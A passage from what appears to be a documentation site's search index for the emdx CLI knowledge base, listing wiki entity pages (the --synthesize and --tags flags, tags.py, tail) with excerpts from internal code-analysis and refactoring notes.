synthesize_documents(\n    self,\n    documents: list[dict[str, Any]],\n    topic: str | None = None,\n    ...\n</code></pre> <p>Verdict: **...</p>"},{"location":"entities/synthesisservicepy/#1-synthesis_servicepy141-topic-parameter","title":"1. <code>synthesis_service.py:141</code> \u2014 <code>topic</code> parameter","text":""},{"location":"entities/synthesisservicepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>zero mock specs = zero regression safety net</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>wikisynthesisservice</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>unspecced mocks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>typed parameters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>type safety audit synthesis:</code>emdx/services/<code>,</code>emdx/ui/<code>, and</code>tests/` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>type safety audit synthesis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>the production code has moderate</code>any<code>usage that's mostly fixable, while the test suite has zero</code>spec=<code>coverage across 220+ mocks \u2014 a significant regression risk.</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>test mock specs:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>test mock gap is the highest-risk finding</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>tasksyncresult</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/synthesize/","title":"--synthesize","text":"<p>Type: tech_term | Mentioned in: 14 documents | First seen: 2026-02-13</p>"},{"location":"entities/synthesize/#documents-14","title":"Documents (14)","text":"<ul> <li> <p>#6849 Delegate: FIX-5: In emdx/commands/delegate.py _run_parallel(), around  [2/4]   Section: Summary</p> <p>...ameter. Individual parallel tasks correctly received <code>limit</code> (line 890), but when <code>--synthesize</code> was used, the synthesis task ran without any cost limit.</p> </li> <li> <p>#6825 Delegate: --help [2/2]   Section: Options</p> <p>...(comma-separated) | | <code>--title</code> | <code>-T</code> | TEXT | Title for output document(s) | | <code>--synthesize</code> | <code>-s</code> | \u2014 | Combine parallel outputs with synthesis | | <code>--jobs</code> | <code>-j</code> | INTEGER | Max parallel tasks (default: auto, max 10) | | <code>--model</code> | <code>-m</code> | TEXT | Model...</p> </li> <li> <p>#6811 Delegate: Fix DOC-7: Update docs/cli-api.md to add the --json flag to  [2/5]   Section: Summary</p> <p>...total_duration_seconds<code>,</code>total_duration`</p> </li> <li> <p>Note about <code>synthesis</code> object when <code>--synthesize</code> is used</p> </li> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: (B) MUST STAY IN LAUNCHER \u2014 Hooks can't do these</p> <p>...alidation | 864\u20131076 | Typer callback: <code>--pr</code>, <code>--branch</code>, <code>--model</code>, <code>--tags</code>, <code>--synthesize</code>, <code>--doc</code>, <code>--epic</code>, <code>--cat</code>, <code>--worktree</code>, <code>--draft</code>, <code>--jobs</code>, <code>--cleanup</code>, mutual exclusivity checks. This is the entry point \u2014 hooks have no CLI. | | 2 | Paral...</p> </li> <li> <p>#6586 Strategic Directions Analysis \u2014 Feb 2026   Section: What You've Built</p> <p>...th auto-save, worktree isolation, PR creation</p> </li> <li><code>--each/--do</code> dynamic discovery</li> <li><code>--synthesize</code> for combining parallel results</li> <li>Recipes, briefings, wrapup, compact, distill</li> <li>Semantic search + hybrid search</li> <li>A full Textual TUI</li> <li> <p>Deep CLAUDE.md integration</p> </li> <li> <p>#6567 Delegate synthesis [synthesis]   Section: Common Themes</p> </li> </ul> <pre><code>emdx delegate --doc 42 --pr --synthesize \"task1\" \"task2\"\n</code></pre> <ul> <li>#6566 Delegate: Review the UnifiedExecutor in emdx/services/unified_executor [2/3]   Section: Synthesis Mode <p>When <code>--synthesize</code> is enabled, after parallel execution completes:</p> </li> <li>All successful task outputs are concatenated</li> <li>Failed task summaries are included</li> <li> <p>A synthesis task runs to cr...</p> </li> <li> <p>#6565 Delegate: Look at the synthesis_service.py \u2014 how does --synthesize wor [3/3]   Section: Overview</p> <p>The <code>--synthesize</code> flag in <code>emdx delegate</code> enables automatic synthesis of parallel task outputs into a unified summary document. This analysis traces the complete flow from CLI option to final summary.</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Parallelism Options</p> Flag Short Description <code>--synthesize</code> <code>-s</code> Combine parallel outputs with a synthesis task <code>--jobs</code> <code>-j</code> Max parallel tasks (default: auto, capped at 10) </li> <li> <p>#6534 EMDX Future Directions: Agent-First Design [2/4]   Section: 8. Agent Communication Panel</p> <p>Concept: If using multi-agent workflows (like <code>emdx delegate</code> with <code>--synthesize</code>), show inter-agent messages and coordination.</p> </li> <li> <p>#6386 Delegate: Research how Claude Code specifically works as an agent \u2014 wh [3/4]   Section: Strategic Differentiation for emdx</p> <p>...research**: Full-text search across all saved content</p> </li> <li> <p>Synthesis pipelines: <code>--synthesize</code> and <code>--chain</code> for combined outputs</p> </li> <li> <p>#6384 Delegate: Think critically about the strategy recommendations in doc # [4/4]   Section: 4. Cost Tracking \u2014 Useful or Premature Optimization?</p> <p>...aluable for both individuals and teams</p> </li> <li>Helps identify expensive patterns (maybe <code>--synthesize</code> costs 10x more than parallel)</li> <li>Essential for any commercial/team use case</li> <li>Can gate behavior: \"abort if this delegate would cost &gt; $X\"</li> <li> <p>Data-driven decisions abo...</p> </li> <li> <p>#6294 DEBT-19: Add missing test coverage for delegate command   Section: Test Coverage Added</p> <p>...s (parallel)</p> </li> <li><code>--chain</code> flag</li> <li><code>--each/--do</code> flags for dynamic discovery</li> <li><code>--synthesize</code> flag</li> <li><code>--worktree</code> flag</li> <li><code>--pr</code> flag (implies worktree)</li> <li><code>--doc</code> flag for document context</li> <li> <p>Error handling (no tasks, mutually exclusive flags)</p> </li> <li> <p>#6191 Delegate: analysis [3/3]   Section: Key Features</p> <p>...Parallel execution: <code>emdx delegate \"task1\" \"task2\" \"task3\"</code></p> </li> <li>Synthesis: <code>--synthesize</code> combines parallel outputs</li> <li>Sequential chains: <code>--chain</code> pipes output between steps</li> <li>Document context: <code>--doc 42</code> prepends document content</li> <li>**PR creation...</li> </ul>"},{"location":"entities/synthesize/#composability","title":"Composability","text":"<p>All flags compose cleanly:</p>"},{"location":"entities/synthesize/#related-entities","title":"Related Entities","text":"<ul> <li><code>--cleanup</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.9)</li> <li><code>worktree pooling</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>parallel mode</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>key implementation details</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>threadpoolexecutor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>dynamic discovery</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>--jobs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>--model</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>select.select()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>execution modes</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> </ul>"},{"location":"entities/tags/","title":"--tags","text":"<p>Type: tech_term | Mentioned in: 17 documents | First seen: 2026-02-13</p>"},{"location":"entities/tags/#documents-17","title":"Documents (17)","text":"<ul> <li> <p>#6825 Delegate: --help [2/2]   Section: Options</p> Flag Short Type Description <code>--tags</code> <code>-t</code> TEXT Tags to apply to outputs (comma-separated) <code>--title</code> <code>-T</code> TEXT Title for output document(s) <code>--synthesize</code> <code>-s</code> \u2014 Combine parall... </li> <li> <p>#6714 Wiki Generation Architecture Research [10/10]   Section: Signature:</p> <p>...\"--all\", help=\"Generate all articles\"),     tags: str | None = typer.Option(None, \"--tags\", \"-t\", help=\"Generate from docs matching tags\"),     stale: bool = typer.Option(False, \"--stale\", help=\"Regenerate only stale articles\"),     force: bool = typer.Op...</p> </li> <li> <p>#6713 wiki-schema-research   Section: Relationship to Existing Link Graph</p> <ol> <li>Tags for filtering: Wiki articles get tagged with <code>wiki</code>, <code>generated</code>, and the topic name. Users can filter them in/out of search results with <code>--tags</code> / <code>--exclude-tags</code>.</li> </ol> </li> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: (B) MUST STAY IN LAUNCHER \u2014 Hooks can't do these</p> <p>...arsing &amp; validation** | 864\u20131076 | Typer callback: <code>--pr</code>, <code>--branch</code>, <code>--model</code>, <code>--tags</code>, <code>--synthesize</code>, <code>--doc</code>, <code>--epic</code>, <code>--cat</code>, <code>--worktree</code>, <code>--draft</code>, <code>--jobs</code>, <code>--cleanup</code>, mutual exclusivity checks. This is the entry point \u2014 hooks have no CLI....</p> </li> <li> <p>#6609 Delegate: Investigate removing the emoji alias system from emdx. The s [1/2]   Section: 3. <code>emdx/commands/core.py</code> \u2014 MODERATE CHANGES**</p> <p>...\u2014 parse directly.</p> </li> <li><code>find()</code> command (line 495): <code>expand_alias_string(tags)</code> for <code>--tags</code> filter. Remove.</li> <li><code>find()</code> command (line 508): <code>expand_alias_string(no_tags)</code> for <code>--no-tags</code> filter. Remove.</li> <li> <p><code>_find_keyword_search()</code> (line 624): `expand...</p> </li> <li> <p>#6598 Delegate synthesis [synthesis]   Section: 3. Import Command Design</p> <p>Key features:</p> </li> <li>Folder \u2192 project mapping (top-level folders become projects)</li> <li>YAML frontmatter parsing (title, tags)</li> <li>Content-hash deduplication (skip exact matches)</li> <li><code>--tags \"imported\"</code> for easy rollback</li> <li> <p>Progress bar for large imports</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Core Task Options</p> <p>...itional) | Task prompt(s) or document IDs. Numeric args auto-load doc content | | <code>--tags</code> | <code>-t</code> | Tags to apply to outputs (comma-separated) | | <code>--title</code> | <code>-T</code> | Title for output document(s) | | <code>--model</code> | <code>-m</code> | Override default model | | <code>--quiet</code>...</p> </li> <li> <p>#6525 Delegate: FEAT-7 Ask-KB Improvements Implementation   Section: Phase 1: Core Filters</p> <p>Changes:</p> </li> <li>Added <code>--tags</code> option to <code>ask</code> and <code>context</code> commands</li> <li>Accepts comma-separated tags (e.g., <code>--tags \"security,active\"</code>)</li> <li> <p>Text aliases auto-expand to emojis (e.g., \"gameplan\" \u2192 \"\ud83c\udfaf\")</p> </li> <li> <p>#6523 Gameplan: FEAT-7 Ask-KB Improvements   Section: Phase 1: Core Filters (HIGH priority)</p> </li> <li>Add <code>--tags</code> option to <code>ask_question()</code> and <code>get_context()</code> in <code>emdx/commands/ask.py</code></li> <li> <p>Create <code>_add_filters(query, tags, recent_days)</code> helper in `emdx/ser...</p> </li> <li> <p>#6521 Delegate synthesis [synthesis]   Section: \ud83d\udd34 HIGH PRIORITY</p> <p>...-|--------| | Git Context in Prime | #446 | 2-3 hrs | \u274c Not implemented | | <code>--tags</code> Filter for Ask | #453 | 45 min | \u274c Not implemented | | <code>--recent</code> Filter for Ask | #453 | 15 min | \u274c Not implemented | | Source Titles in Citations | #453...</p> </li> <li> <p>#6519 Delegate: Analyze FEAT-7: Re-implement ask-kb improvements (PR #453).  [2/2]   Section: 1. <code>--tags</code> Filter \u274c MISSING**</p> <p>What it does: Filter search to only docs with specific tags (e.g., <code>--tags \"gameplan,active\"</code>)</p> </li> <li> <p>#6395 Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]   Section: Agent Patterns</p> <p>Input Methods:</p> </li> <li><code>echo \"output\" | emdx save --title \"...\" --tags \"...\"</code> \u2014 programmatic save</li> <li><code>emdx delegate \"task\"</code> \u2014 auto-saves output to KB</li> <li>Never uses <code>emdx edit</code> (no interactive editing)</li> <li> <p>Never uses GUI</p> </li> <li> <p>#6366 Gameplan: emdx distill \u2014 Synthesize KB Content for Sharing   Section: Commands</p> <p>```bash</p> </li> </ul>"},{"location":"entities/tags/#add-tags-filter","title":"Add <code>--tags</code> filter","text":""},{"location":"entities/tags/#basic-distill-docs-by-tag","title":"Basic: distill docs by tag","text":"<p>emdx distill --tags \"security,analysis\"</p> <ul> <li>#6264 Delegate: API/Interface Debt Fix - Help Text and Silent Failures   Section: Summary <p>The tag input format has two deliberate patterns:</p> </li> <li>Arguments (e.g., <code>emdx tag 42 foo bar</code>): Space-separated for ergonomics</li> <li> <p>Options (e.g., <code>--tags \"foo,bar\"</code>): Comma-separated for compactness</p> </li> <li> <p>#6226 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]   Section: HIGH SEVERITY (API Inconsistency)</p> <p>...: <code>core.py:save()</code>, <code>find()</code>, <code>delegate.py</code> Issue:** Tags can be passed as:</p> </li> <li><code>--tags \"tag1,tag2\"</code> (comma-separated string) - most commands</li> <li> <p><code>-t tag1 tag2</code> (space-separated list) - <code>delegate</code>'s <code>--tags</code> is <code>List[str]</code></p> </li> <li> <p>#6218 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]   Section: 1. Inconsistent Argument Naming Across Commands</p> <p>...|----------|---------------| | <code>save</code> | <code>-t/--title</code> | Title flag | | <code>find</code> | <code>-t/--tags</code> | Same <code>-t</code> means different thing! | | <code>cascade add</code> | <code>-t/--title</code> | Title flag | | <code>cascade add</code> | <code>-s/--stage</code> | Different meaning | | <code>tag list</code> | <code>-s/--sort</code> |...</p> </li> <li> <p>#6151 Delegate: Review PR #453 (Ask the KB). Run: gh pr diff 453. Check code [6/7]   Section: Gameplan Compliance \u2705</p> <p>...Implementation | Status | |---------------------|-------------------|--------| | <code>--tags</code> filter | \u2705 Added with emoji alias support | Done | | <code>--recent &lt;days&gt;</code> filter | \u2705 Added via <code>--recent</code> / <code>-r</code> | Done | | <code>--project</code> scope | \u2705 Already existed, pres...</p> </li> </ul>"},{"location":"entities/tags/#related-entities","title":"Related Entities","text":"<ul> <li><code>--recent</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.6)</li> <li><code>source_titles: list[tuple[int, str]]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>recent_days</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>enhanced output</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>emdx ai context</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>core filters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>context budget</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>ask()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>--machine</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>normalize_tag_to_emoji()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/tagspy/","title":"tags.py","text":"<p>Type: heading | Mentioned in: 20 documents | First seen: 2026-01-05</p>"},{"location":"entities/tagspy/#documents-20","title":"Documents (20)","text":"<ul> <li>#6503 None Type Analysis [2/7]   Section: File-by-File Analysis </li> <li><code>tags: list[str] | None = typer.Argument(None, ...)</code> - Legitimate: can call without tags</li> <li> <p><code>project: str | None = typer.Option(None, ...)</code> - Legitimate: op...</p> </li> <li> <p>#6433 Any/None typing audit [2/5]   Section: Recommendations</p> <p>...e</p> </li> <li>Medium priority: Replace <code>list[Any]</code> SQL params with <code>list[str | int]</code> in tags.py and tasks.py</li> <li>Lower priority: For <code>**kwargs: Any</code> in update functions, consider:</li> <li>Python 3.12+: Use <code>TypedDict</code> + <code>Unpack[T]</code> </li> <li> <p>Python 3.11: Document a...</p> </li> <li> <p>#6416 Type System Audit: Replace Any/None with Concrete Types [1/4]</p> <p><code>get_category(key: str) -&gt; dict[str, Any] | None</code> Location: Line 27 Current: Returns <code>SELECT * FROM categories</code> as dict Keys:</p> </li> <li><code>key: str</code> \u2014 Category key (2-8 uppercase letters)</li> <li><code>name: str</code> \u2014 Category name</li> <li> <p><code>description: str</code> \u2014 Categor...</p> </li> <li> <p>#6520 Delegate: Analyze FEAT-5: Re-implement smart priming (PR #446). The or [1/2]   Section: \u2705 IMPLEMENTED (Already in Current Codebase)</p> <p>...dge_map()<code>with tag aggregation | Tag aggregation exists via</code>tag list<code>command |</code>tags.py<code>| | **Cascade Queue Status** |</code>_get_cascade_status()<code>| Implemented identically |</code>prime.py:295-318<code>| | **Active Epics** | Not in PR #446 | Added to prime |</code>prim...</p> </li> <li> <p>#6428 Add TaskDict TypedDicts to models layer   Section: Add TypedDict definitions to models layer</p> </li> <li> <p>#6407 PR Evaluation: #567, #569, #572, #573, #575 vs mypy PR #588   Section: Detailed Analysis</p> <p>...Helpers Refactor</p> </li> <li>Files: 9 (introduces <code>_helpers.py</code>, refactors <code>browse.py</code>, <code>tags.py</code>, <code>trash.py</code>)</li> <li>Overlap: 3 files (<code>browse.py</code>, <code>tags.py</code>, <code>trash.py</code>)</li> <li> <p>Issue: These 3 command files were modified in #588 for mypy compliance. Rebasing woul...</p> </li> <li> <p>#6404 Bug Fix PR Reviews [6/6]   Section: Review Summary</p> <p>..._update_group_metrics()</p> </li> <li><code>executions.py</code>: get_execution_stats() (2 locations)</li> <li><code>tags.py</code>: get_or_create_tag(), merge_tags()</li> <li> <p><code>tasks.py</code>: create_task() epic_seq</p> </li> <li> <p>#6396 Delegate: DB Safety Fixes (Tasks #620, #624, #626, #629)   Section: Summary</p> <p>...ore commit (SQLite requirement)</p> </li> <li> <p>Updated <code>add_tags_to_document()</code> in <code>emdx/models/tags.py</code> to accept optional connection parameter</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Layer Structure (Current)</p> <p>...es)        \u2502 \u2502 \u251c\u2500\u2500 executions.py Raw SQL operations                        \u2502 \u2502 \u251c\u2500\u2500 tags.py       Raw SQL operations                        \u2502 \u2502 \u2514\u2500\u2500 tasks.py      Raw SQL operations                        \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500...</p> </li> <li> <p>#6323 Delegate: Analyze emdx/commands/ for architecture improvements. Focus  [1/10]   Section: 1. Code Duplication</p> <p>...of nearly every command handler:</p> </li> <li><code>core.py</code>: lines 141, 364, 581, 654, 772-773</li> <li><code>tags.py</code>: lines 42, 153, 191, 237, 281, 334</li> <li><code>trash.py</code>: lines 56, 106, 165</li> <li><code>browse.py</code>: lines 30, 96, 145</li> <li> <p><code>groups.py</code>: lines 39, 84, 139, 189, 296, 372, 418</p> </li> <li> <p>#6319 Codebase Quality Analysis \u2014 Synthesized Summary (2026-02-14)   Section: Tier 1: Architecture Issues (High Impact)</p> <p>...ds bypass services layer | HIGH | <code>core.py</code>, <code>browse.py</code>, <code>gist.py</code>, <code>groups.py</code>, <code>tags.py</code>, <code>trash.py</code> import <code>database/</code> directly | | 2 layer violations | MEDIUM | <code>database/documents.py</code> imports from <code>models/tags</code> (upward); <code>utils/claude_wrapper.py</code> imp...</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>...- <code>core.py</code>: save, find, view, edit, delete</p> </li> <li><code>browse.py</code>: list, recent, stats</li> <li><code>tags.py</code>: tag add/remove/list/rename/merge/batch</li> <li><code>trash.py</code>: trash, restore, purge</li> <li><code>tasks.py</code>: agent work queue with dependencies</li> <li> <p><code>groups.py</code>: hierarchical document or...</p> </li> <li> <p>#6306 Delegate: Analyze SEPARATION OF CONCERNS across emdx/ (exclude ui/ and [5/15]   Section: 1. CRITICAL: <code>models/</code> is Actually a Database Layer**</p> <p>Files: <code>models/tags.py</code>, <code>models/tasks.py</code>, <code>models/executions.py</code>, <code>models/documents.py</code></p> </li> <li> <p>#6179 Delegate: 10 [17/17]   Section: Key Components Added</p> </li> <li>Core tag operations: add, remove, rename, merge</li> <li>Tag validation and normalization</li> <li> <p>Usage statistics tracking</p> </li> <li> <p>#6162 Delegate: Audit test coverage. Check: (1) is there a test file for emd [8/17]   Section: (5) Which command modules have NO test file at all?</p> <p>...TIAL (tests service, some CLI in <code>test_similarity.py</code>) | | <code>status.py</code> | \u274c NO | | <code>tags.py</code> | \u2705 YES (<code>test_commands_tags.py</code>) | | <code>tasks.py</code> | \u274c NO | | <code>trash.py</code> | \u274c NO |</p> </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>...ated** to use shared console:\\n     - <code>agents.py</code> \u2713\\n     - <code>browse.py</code> \u2713\\n     - <code>tags.py</code> \u2713\\n     - <code>export_profiles.py</code> \u2713\\n     - <code>gdoc.py</code> \u2713\\n     - <code>core.py</code> \u2713\\n     - <code>export.py</code> \u2713\\n     - <code>tasks.py</code> \u2713\\n     - <code>gist.py</code> \u2713\\n     - <code>lifecycle.py</code> \u2713\\n...</p> </li> <li> <p>#1835 Architecture Analysis: EMDX Control Center v5 Implementation   Section: Current Architecture Strengths</p> <p>...management and execution</p> </li> <li><code>executions.py</code> (500+ lines) - execution monitoring</li> <li> <p><code>tags.py</code> (400+ lines) - tag management</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...- groups.py: All necessary</p> </li> <li>maintain.py: All necessary (return types)</li> <li>tags.py: All necessary</li> <li>stale.py: All necessary</li> <li>recipe.py: All necessary</li> <li>gist.py: All necessary</li> <li>epics.py: All necessary</li> <li> <p>ask.py: All necessary...</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>...k queue for Claude sessions. Simple, focused, integrates well with delegate. | | tags.py | 426 | USEFUL - Tagging system with emoji aliases. Clean implementation. | | prime.py | 402 | USEFUL - Session priming for Claude. Provides context fo...</p> </li> <li> <p>#6346 Delegate: PR #565 - Command Helpers Adoption [6/12]   Section: Changes Made</p> <p>...trash.py: Removed ~40 lines of boilerplate by using <code>@combined_decorator</code></p> </li> <li>tags.py: Removed ~50 lines by using <code>@combined_decorator</code> and <code>require_document()</code></li> <li>browse.py: Removed ~30 lines by using <code>@combined_decorator</code></li> </ul>"},{"location":"entities/tagspy/#tagspy_1","title":"tags.py","text":""},{"location":"entities/tagspy/#summary","title":"Summary","text":"<p>Created <code>emdx/models/types.py</code> with TypedDict definitions and updated return type annotations in <code>tasks.py</code>, <code>categories.py</code>, and <code>tags.py</code>.</p>"},{"location":"entities/tagspy/#2-tag-management-module-tagspy-292-lines","title":"2. Tag Management Module (<code>tags.py</code> - 292 lines)","text":""},{"location":"entities/tagspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>ask.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.4)</li> <li><code>epics.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>services/analysis_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>categories.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.2)</li> <li><code>analyze.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.1)</li> <li><code>trash.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=5.0)</li> <li><code>browse.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=4.9)</li> <li><code>gist.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=4.9)</li> <li><code>executions.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (13 shared docs, PMI=4.8)</li> <li><code>maintain.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=4.7)</li> </ul>"},{"location":"entities/tail/","title":"tail","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-14</p>"},{"location":"entities/tail/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6836 Delegate: list   Section: Summary</p> <p>The <code>emdx delegate</code> command now supports subcommands (<code>list</code>, <code>running</code>, <code>stats</code>, <code>show</code>, <code>logs</code>, <code>tail</code>, <code>kill</code>, <code>killall</code>, <code>health</code>, <code>monitor</code>) that were previously only accessible via <code>emdx exec</code> (now folded into delegate).</p> </li> <li> <p>#6825 Delegate: --help [2/2]   Section: Subcommands (Execution Management)</p> <p>...g executions | | <code>stats</code> | Show execution statistics | | <code>show</code> | Show execution details with integrated log viewer | | <code>logs</code> | Show only the logs for an execution (no metadata) | | <code>tail</code> | Follow the log of a running execution (alias for <code>show -f</code>) |...</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: 4. Dynamic Discovery Mode (<code>--each</code> + <code>--do</code>)</p> <p>...<code>fd</code>, <code>find</code>, <code>ls</code>, <code>eza</code>, <code>rg</code>, <code>git</code>, <code>locate</code>, <code>tree</code>, <code>echo</code>, <code>cat</code>, <code>head</code>, <code>tail</code>, <code>seq</code></p> </li> <li>Runs command with <code>shell=False</code> (injection-safe)</li> <li>Templates each output line into task prompts</li> <li> <p>Discovered tasks prepend to any explicit tasks</p> </li> <li> <p>#6276 Delegate: DEBT-1: Fix command injection vulnerability in emdx/commands   Section: emdx/commands/delegate.py</p> <ol> <li>Added 